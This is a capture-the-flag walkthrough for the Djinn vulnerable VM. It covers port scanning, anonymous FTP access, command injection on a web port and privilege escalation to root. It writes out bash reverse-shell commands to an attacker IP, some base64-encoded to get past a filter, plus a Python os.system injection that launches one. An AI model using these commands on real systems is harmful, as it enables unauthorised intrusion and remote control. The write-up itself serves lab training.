# Djinn-walkthough

## Tool:Vmware,nmap,nikto,nc

Use nat type and discover the host by:

```bash
discover -r 
```

## Information Gathering

### Port scan

Use nmap to do a full scan on the target. Use command:

```bash
 nmap -Pn -sS —stats-every 3m —max-restries 1 —max-scan-delay 20 —defeat-rst-ratelimit -T4 -p- [ip]
```

We can notice that there is no http port opened.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled.png)

Do detail scan on those ports.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%201.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%201.png)

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%202.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%202.png)

FTP can be accessed by anonymous, and 1337 is a interesting port and 7331 is a http port.

### FTP anonymous login

Use ftp to login the target

```bash
ftp [ip]
```

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%203.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%203.png)

Download these 3 txt file.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%204.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%204.png)

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%205.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%205.png)

### Use telnet to connect 1337

```bash
telnet [ip] 1337
```

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%206.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%206.png)

It is a game to get a simple calculation result, It shows that after 1000 times can get some information, maybe I should write a script to do this 1000 times.

Try other ports first.

Use nikto to scan the 7331.

```bash
nikto -h [ip] -p 7331
```

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%207.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%207.png)

found a web structure named wekzeug. Google that, and get a vuln 43905 on exploit-db. Try this.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%208.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%208.png)

It doesn't work due to the debug is not enabled.

Use dirsearch to scan this.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%209.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%209.png)

Got two pathes.

Browser those and found this below.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2010.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2010.png)

It is a typical command execute vuln. Try to reverse a shell to local.

I found that it can only execute some simple order, maybe the order is filtered. try base64 encode bypass.Encode this.

```bash
bash -i >& /dev/tcp/[ip]/443 0>&1
```

use the encoded string.

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMi4xNDMvNDQzIDA+JjEKCg==|base64 -d |bash
```

listen 443 on local. execute that command.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2011.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2011.png)

Get shell

## Privilege  escape

Look for the suid command.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2012.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2012.png)

no noticable info found.

Tried switch to nitish use the password that creds.txt provided, failed.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2013.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2013.png)

use sudo -l, no password for www-data.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2014.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2014.png)

Get in to home page.found two users.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2015.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2015.png)

Try to show the hidden files.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2016.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2016.png)

Another creds.txt found, this time the password is in that.

Switch into that.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2017.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2017.png)

Use sudo -l

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2018.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2018.png)

It seems that I should change to user sam.

Try to understand the "genie" command. use "man" command to see the detail of "genie".

finally, found that the way to choose to sam.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2019.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2019.png)

Use sudo -l again.

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2020.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2020.png)

Try to understan how to get root by "lago"

Find a pyc file of lago in sam folder.

Use uncomyple6 to decompile this file, and we can know the the to execute lago and get root.

There is another way to get root by 1337, the > in the game seems like the command line. Got this, you can know this is a python command line. so use python script to get root

![Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2021.png](Djinn-walkthough%2080625056d02944378eadef893e6e3e21/Untitled%2021.png)

```python
**import**("os").system("nc [ip] 444")
```

By the command, I can get a connect from the target, It proved that this can be the way to root, so change the command,

```python
**import**("os").system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMi4xNDUvNDQ0IDA+JjE= |base64 -d |bash")
```

get root.